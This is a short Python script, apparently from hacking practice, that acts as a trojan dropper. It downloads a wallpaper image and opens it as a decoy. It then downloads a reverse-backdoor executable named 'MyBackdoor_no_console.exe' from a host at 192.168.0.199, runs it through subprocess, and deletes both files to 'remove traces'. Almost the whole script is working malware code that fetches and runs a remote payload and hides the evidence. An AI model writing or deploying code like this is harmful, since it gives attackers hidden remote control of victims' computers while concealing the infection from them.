#!usr/bin/env python3
import requests, subprocess, os, tempfile


def download(url:str)->bool:
    try:
        response = requests.get(url)
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as file:
            file.write(response.content)
        return True

    except Exception as e:
        print('[-] Exception : ', e)
        return False


def get_file_name(url:str)->str:
    return url.split('/')[-1]

# get and change dir to tempdir
temp_path = tempfile.gettempdir()
os.chdir(temp_path)

# download and execute files
file_url = 'https://wallpapercave.com/wp/HGMtO8W.jpg'
download(file_url)
file_name = get_file_name(file_url)
subprocess.Popen(file_name,shell=True)


evil_file_url = 'http://192.168.0.199:8000/malwares/reverse_backdoor/dist/MyBackdoor_no_console.exe'
download(evil_file_url)
evil_file = get_file_name(evil_file_url)
subprocess.call(evil_file, shell=True)

# remove traces
os.remove(file_name)
os.remove(evil_file)
